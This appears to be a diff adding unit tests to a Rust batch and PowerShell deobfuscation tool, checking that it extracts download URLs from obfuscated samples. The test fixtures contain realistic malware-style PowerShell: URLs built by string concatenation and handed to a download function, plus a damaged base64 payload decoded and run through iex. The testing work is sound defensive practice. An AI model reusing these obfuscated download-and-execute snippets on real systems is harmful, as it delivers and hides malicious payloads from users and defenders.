@@ -2,7 +2,7 @@
 //! Source: ../../batch_deobfuscator/tests/test_unittests.py
 #![allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)]
 
-use batdeob_core::{analyze, Config};
+use batdeob_core::{analyze, Config, Trait};
 
 fn deob(script: &str) -> String {
     let report = analyze(script.as_bytes(), &Config::default());
@@ -108,5 +108,54 @@ fn dosfuscation_type_self_extract_findstr() {
         deob.contains("SELF_EXTRACTED_PAYLOAD"),
         "expected SELF_EXTRACTED_PAYLOAD in:\n{}",
         deob
+    );
+}
+
+#[test]
+fn analyze_extracts_inline_powershell_string_concat_urls() {
+    let script = br#"powershell "$Bytes='ht';$Bytes2='tps://';$base=$Bytes+$Bytes2;$links=@(($base+'nanshiin.com/1.jpg'),($base+'paste.sensio.no/ArlenDenial'));DownloadDataFromLinks $links""#;
+
+    let report = analyze(script, &Config::default());
+
+    assert!(
+        report.traits.iter().any(|t| {
+            matches!(t, Trait::Download { src, .. } if src == "https://nanshiin.com/1.jpg")
+        }),
+        "nanshiin URL was not extracted: {:?}",
+        report.traits
+    );
+    assert!(
+        report.traits.iter().any(|t| {
+            matches!(t, Trait::Download { src, .. } if src == "https://paste.sensio.no/ArlenDenial")
+        }),
+        "paste URL was not extracted: {:?}",
+        report.traits
+    );
+}
+
+#[test]
+fn analyze_decodes_damaged_hell_base64_powershell_literals() {
+    use base64::Engine;
+
+    let payload = "Start-Sleep -Seconds 3;$Bytes='ht';$Bytes2='tps://';$base=$Bytes+$Bytes2;$links=@(($base+'nanshiin.com/1.jpg'))";
+    let mut bytes = Vec::new();
+    for unit in payload.encode_utf16() {
+        bytes.extend_from_slice(&unit.to_le_bytes());
+    }
+    let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
+    let damaged = encoded.replacen('r', "f#", 1);
+    let script = format!(
+        "\u{2}\u{3}hell \"$ddsdgo \0'{}'; iex([Text.Encoding]::Unicode.GetString([Convert]::Fromba\0e\004\0\0( $ddsdgo\u{2}replace('f#','r') )))\"",
+        damaged
+    );
+
+    let report = analyze(script.as_bytes(), &Config::default());
+
+    assert!(
+        report.traits.iter().any(|t| {
+            matches!(t, Trait::Download { src, .. } if src == "https://nanshiin.com/1.jpg")
+        }),
+        "nanshiin URL was not extracted: {:?}",
+        report.traits
     );
 }
